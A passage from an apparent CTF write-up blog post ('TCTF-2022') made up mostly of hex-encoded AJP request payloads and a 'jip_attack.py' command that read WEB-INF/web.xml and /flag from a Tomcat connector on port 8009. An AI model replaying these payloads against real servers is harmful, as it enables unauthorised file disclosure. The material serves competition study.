+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 jip_attack.py -p <span class="number">8009</span> -f WEB<span class="literal">-INF</span>/web.<span class="keyword">xml</span>  <span class="title">10</span>.<span class="number">233.0</span>.<span class="number">11</span></span><br></pre></td></tr></table></figure>
+
+<p>3132372e302e302e31</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1234018102020008485454502</span>f<span class="number">312e310000052</span>f<span class="number">617364660000093132372e302</span>e<span class="number">302e3100</span>ffff<span class="number">00093132372e302</span>e<span class="number">302e31000050000009</span>a<span class="number">006000</span>a<span class="number">6</span>b<span class="number">6565702</span>d<span class="number">616</span><span class="keyword">c</span><span class="number">69766500000</span>f<span class="number">4163636570742</span>d<span class="number">4</span><span class="keyword">c</span><span class="number">616e677561676500000</span>e<span class="number">656e2</span>d<span class="number">55532</span><span class="keyword">c</span><span class="number">656e3</span>b<span class="number">713</span>d<span class="number">302e3500</span>a<span class="number">00800013000000</span>f<span class="number">4163636570742</span>d<span class="number">456e636</span>f<span class="number">64696e67000013677</span>a<span class="number">69702</span><span class="keyword">c</span><span class="number">206465666</span><span class="keyword">c</span><span class="number">6174652</span><span class="keyword">c</span><span class="number">207364636800000</span>d<span class="number">43616368652</span>d<span class="number">436</span>f<span class="number">6e74726</span>f<span class="number">6</span><span class="keyword">c</span><span class="number">0000096</span>d<span class="number">61782</span>d<span class="number">6167653</span>d<span class="number">3000</span>a<span class="number">00e00074</span>d<span class="number">6</span>f<span class="number">7</span>a<span class="number">696</span><span class="keyword">c</span><span class="number">6</span><span class="keyword">c</span><span class="number">61000019557067726164652</span>d<span class="number">496e7365637572652</span>d<span class="number">52657175657374730000013100</span>a<span class="number">0010009746578742</span>f<span class="number">68746</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">00</span>a<span class="number">00</span>b<span class="number">00093132372e302</span>e<span class="number">302e31000</span>a<span class="number">00216</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e726571756573745</span>f<span class="number">7572690000012</span>f<span class="number">000</span>a<span class="number">001</span>f<span class="number">6</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e706174685</span>f<span class="number">696e666</span>f<span class="number">00000</span>f<span class="number">5745422</span>d<span class="number">494e462</span>f<span class="number">7765622e786</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">000</span>a<span class="number">00226</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e736572766</span><span class="keyword">c</span><span class="number">65745</span>f<span class="number">706174680000012</span>f<span class="number">00</span>ff</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0008485454502</span>f<span class="number">312e310000052</span>f<span class="number">6173646600000931302e3233332</span>e<span class="number">302e313100</span>ffff<span class="number">000931302e3233332</span>e<span class="number">302e3131000050000009</span>a<span class="number">006000</span>a<span class="number">6</span>b<span class="number">6565702</span>d<span class="number">616</span><span class="keyword">c</span><span class="number">69766500000</span>f<span class="number">4163636570742</span>d<span class="number">4</span><span class="keyword">c</span><span class="number">616e677561676500000</span>e<span class="number">656e2</span>d<span class="number">55532</span><span class="keyword">c</span><span class="number">656e3</span>b<span class="number">713</span>d<span class="number">302e3500</span>a<span class="number">00800013000000</span>f<span class="number">4163636570742</span>d<span class="number">456e636</span>f<span class="number">64696e67000013677</span>a<span class="number">69702</span><span class="keyword">c</span><span class="number">206465666</span><span class="keyword">c</span><span class="number">6174652</span><span class="keyword">c</span><span class="number">207364636800000</span>d<span class="number">43616368652</span>d<span class="number">436</span>f<span class="number">6e74726</span>f<span class="number">6</span><span class="keyword">c</span><span class="number">0000096</span>d<span class="number">61782</span>d<span class="number">6167653</span>d<span class="number">3000</span>a<span class="number">00e00074</span>d<span class="number">6</span>f<span class="number">7</span>a<span class="number">696</span><span class="keyword">c</span><span class="number">6</span><span class="keyword">c</span><span class="number">61000019557067726164652</span>d<span class="number">496e7365637572652</span>d<span class="number">52657175657374730000013100</span>a<span class="number">0010009746578742</span>f<span class="number">68746</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">00</span>a<span class="number">00</span>b<span class="number">000931302e3233332</span>e<span class="number">302e3131000</span>a<span class="number">00216</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e726571756573745</span>f<span class="number">7572690000012</span>f<span class="number">000</span>a<span class="number">001</span>f<span class="number">6</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e706174685</span>f<span class="number">696e666</span>f<span class="number">00000</span>f<span class="number">5745422</span>d<span class="number">494e462</span>f<span class="number">7765622e786</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">000</span>a<span class="number">00226</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e736572766</span><span class="keyword">c</span><span class="number">65745</span>f<span class="number">706174680000012</span>f<span class="number">00</span>ff</span><br></pre></td></tr></table></figure>
+
+<p>3132372e302e302e31 换成 </p>
+<p>31302e3233332e302e3131</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0008485454502</span>f<span class="number">312e310000012</span>f<span class="number">0000093132372e302</span>e<span class="number">302e3100</span>ffff<span class="number">0001610000500000000</span>a<span class="number">00216</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e726571756573745</span>f<span class="number">7572690000012</span>f<span class="number">000</span>a<span class="number">00226</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e736572766</span><span class="keyword">c</span><span class="number">65745</span>f<span class="number">706174680001532</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">000</span>a<span class="number">001</span>f<span class="number">6</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e706174685</span>f<span class="number">696e666</span>f<span class="number">0000102</span>f<span class="number">5745422</span>d<span class="number">494e462</span>f<span class="number">7765622e786</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">00</span>f</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0008485454502</span>f<span class="number">312e310000012</span>f<span class="number">00000931302e3233332</span>e<span class="number">302e313100</span>ffff<span class="number">0001610000500000000</span>a<span class="number">00216</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e726571756573745</span>f<span class="number">7572690000012</span>f<span class="number">000</span>a<span class="number">00226</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e736572766</span><span class="keyword">c</span><span class="number">65745</span>f<span class="number">706174680001532</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">000</span>a<span class="number">001</span>f<span class="number">6</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e706174685</span>f<span class="number">696e666</span>f<span class="number">0000102</span>f<span class="number">5745422</span>d<span class="number">494e462</span>f<span class="number">7765622e786</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">00</span>f</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="keyword">c</span><span class="number">1</span> | xxd -r -p &gt; <span class="keyword">c</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>3132372e302e302e31</p>
+<p>31302e3233332e302e3131</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1234017702020008485454502</span>f<span class="number">312e310000052</span>f<span class="number">617364660000093132372e302</span>e<span class="number">302e3100</span>ffff<span class="number">00093132372e302</span>e<span class="number">302e31000050000009</span>a<span class="number">006000</span>a<span class="number">6</span>b<span class="number">6565702</span>d<span class="number">616</span><span class="keyword">c</span><span class="number">69766500000</span>f<span class="number">4163636570742</span>d<span class="number">4</span><span class="keyword">c</span><span class="number">616e677561676500000</span>e<span class="number">656e2</span>d<span class="number">55532</span><span class="keyword">c</span><span class="number">656e3</span>b<span class="number">713</span>d<span class="number">302e3500</span>a<span class="number">00800013000000</span>f<span class="number">4163636570742</span>d<span class="number">456e636</span>f<span class="number">64696e67000013677</span>a<span class="number">69702</span><span class="keyword">c</span><span class="number">206465666</span><span class="keyword">c</span><span class="number">6174652</span><span class="keyword">c</span><span class="number">207364636800000</span>d<span class="number">43616368652</span>d<span class="number">436</span>f<span class="number">6e74726</span>f<span class="number">6</span><span class="keyword">c</span><span class="number">0000096</span>d<span class="number">61782</span>d<span class="number">6167653</span>d<span class="number">3000</span>a<span class="number">00e00074</span>d<span class="number">6</span>f<span class="number">7</span>a<span class="number">696</span><span class="keyword">c</span><span class="number">6</span><span class="keyword">c</span><span class="number">61000019557067726164652</span>d<span class="number">496e7365637572652</span>d<span class="number">52657175657374730000013100</span>a<span class="number">0010009746578742</span>f<span class="number">68746</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">00</span>a<span class="number">00</span>b<span class="number">00093132372e302</span>e<span class="number">302e31000</span>a<span class="number">00216</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e726571756573745</span>f<span class="number">7572690000012</span>f<span class="number">000</span>a<span class="number">001</span>f<span class="number">6</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e706174685</span>f<span class="number">696e666</span>f<span class="number">0000052</span>f<span class="number">666</span><span class="keyword">c</span><span class="number">6167000</span>a<span class="number">00226</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e736572766</span><span class="keyword">c</span><span class="number">65745</span>f<span class="number">706174680000012</span>f<span class="number">00</span>ff</span><br></pre></td></tr></table></figure>
+
+<p>0x17d</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1234017</span>d<span class="number">02020008485454502</span>f<span class="number">312e310000052</span>f<span class="number">6173646600000931302e3233332</span>e<span class="number">302e313100</span>ffff<span class="number">000931302e3233332</span>e<span class="number">302e3131000050000009</span>a<span class="number">006000</span>a<span class="number">6</span>b<span class="number">6565702</span>d<span class="number">616</span><span class="keyword">c</span><span class="number">69766500000</span>f<span class="number">4163636570742</span>d<span class="number">4</span><span class="keyword">c</span><span class="number">616e677561676500000</span>e<span class="number">656e2</span>d<span class="number">55532</span><span class="keyword">c</span><span class="number">656e3</span>b<span class="number">713</span>d<span class="number">302e3500</span>a<span class="number">00800013000000</span>f<span class="number">4163636570742</span>d<span class="number">456e636</span>f<span class="number">64696e67000013677</span>a<span class="number">69702</span><span class="keyword">c</span><span class="number">206465666</span><span class="keyword">c</span><span class="number">6174652</span><span class="keyword">c</span><span class="number">207364636800000</span>d<span class="number">43616368652</span>d<span class="number">436</span>f<span class="number">6e74726</span>f<span class="number">6</span><span class="keyword">c</span><span class="number">0000096</span>d<span class="number">61782</span>d<span class="number">6167653</span>d<span class="number">3000</span>a<span class="number">00e00074</span>d<span class="number">6</span>f<span class="number">7</span>a<span class="number">696</span><span class="keyword">c</span><span class="number">6</span><span class="keyword">c</span><span class="number">61000019557067726164652</span>d<span class="number">496e7365637572652</span>d<span class="number">52657175657374730000013100</span>a<span class="number">0010009746578742</span>f<span class="number">68746</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">00</span>a<span class="number">00</span>b<span class="number">000931302e3233332</span>e<span class="number">302e3131000</span>a<span class="number">00216</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e726571756573745</span>f<span class="number">7572690000012</span>f<span class="number">000</span>a<span class="number">001</span>f<span class="number">6</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e706174685</span>f<span class="number">696e666</span>f<span class="number">0000052</span>f<span class="number">666</span><span class="keyword">c</span><span class="number">6167000</span>a<span class="number">00226</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e736572766</span><span class="keyword">c</span><span class="number">65745</span>f<span class="number">706174680000012</span>f<span class="number">00</span>ff</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat e1 <span class="string">| xxd -r -p &gt; e2</span></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>b1ue0cean
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="http://example.com/2022/09/17/TCTF-2022/" title="TCTF-2022">http://example.com/2022/09/17/TCTF-2022/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="https://twitter.com/b1ue0cean7">
+          <span class="icon">
+            <i class="fab fa-twitter"></i>
+          </span>
+
+          <span class="label">Twitter</span>
+        </a>
+      </div>
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class=""></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
